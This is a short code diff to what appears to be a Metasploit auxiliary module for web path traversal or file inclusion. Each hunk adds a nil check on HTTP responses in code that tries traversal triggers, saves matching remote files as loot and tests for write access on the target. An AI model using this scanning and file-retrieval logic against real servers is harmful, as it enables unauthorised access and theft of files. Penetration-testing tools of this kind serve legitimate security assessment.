@@ -103,7 +103,7 @@ class Metasploit3 < Msf::Auxiliary
 					req = ini_request(datastore['PATH'] + trigger + f)
 					vprint_status("Trying: http://#{rhost}:#{rport}#{req['uri']}")
 					res = send_request_cgi(req, 25)
-					return trigger if res.to_s =~ datastore['PATTERN']
+					return trigger if res and res.to_s =~ datastore['PATTERN']
 				end
 			end
 		end
@@ -182,7 +182,7 @@ class Metasploit3 < Msf::Auxiliary
 			req = ini_request(uri)
 			vprint_status("Trying: http://#{rhost}:#{rport}#{uri}")
 			res = send_request_cgi(req, 25)
-			found = true if res.to_s =~ datastore['PATTERN']
+			found = true if res and res.to_s =~ datastore['PATTERN']
 		end
 
 		# Reporting
@@ -223,7 +223,7 @@ class Metasploit3 < Msf::Auxiliary
 			vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}")
 
 			# Only download files that are withint our interest
-			if res.to_s =~ datastore['PATTERN']
+			if res and res.to_s =~ datastore['PATTERN']
 				# We assume the string followed by the last '/' is our file name
 				fname = f.split("/")[-1].chop
 				loot = store_loot("lfi.data","text/plain",rhost, res.body,fname)
@@ -267,7 +267,7 @@ class Metasploit3 < Msf::Auxiliary
 		res = send_request_cgi(req, 25)
 
 		# Did we get it?
-		if res.body =~ /#{unique_str}/
+		if res and res.body =~ /#{unique_str}/
 			print_good("WRITE is possible on #{rhost}:#{rport}")
 		else
 			print_error("WRITE seems unlikely")
